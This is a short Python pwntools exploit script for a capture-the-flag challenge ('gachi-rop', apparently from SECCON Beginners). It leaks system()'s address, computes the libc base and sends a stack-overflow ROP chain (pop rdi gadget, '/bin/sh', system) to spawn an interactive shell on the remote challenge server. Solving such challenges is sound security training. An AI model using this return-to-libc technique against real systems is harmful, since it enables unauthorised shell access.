#!/usr/bin/env python3

from pwn import *

exe = ELF("./gachi-rop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
rop = ROP(libc)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("gachi-rop.beginners.seccon.games", 4567)

    return r


def main():
    r = conn()

    r.recvuntil(b"@")
    system = int(r.recvline()[:-1].decode('utf-8'), 16)
    info(f"system:{hex(system)}")
    input("wait")
    libc.address = system - 0x50d70
    info(f"libc_base:{hex(libc.address)}")

    # stack_pivot_addr = exe.bss() + 0xa00
    payload = b"a"*0x18
    payload += p64(next(libc.search(asm('pop rdi ; ret'), executable=True)))
    payload += p64(next(libc.search(b'/bin/sh\x00')))
    payload += p64(next(exe.search(asm('ret'), executable=True)))
    payload += p64(system)

    r.sendlineafter(b"Name: ", payload)

    r.interactive()

if __name__ == "__main__":
    main()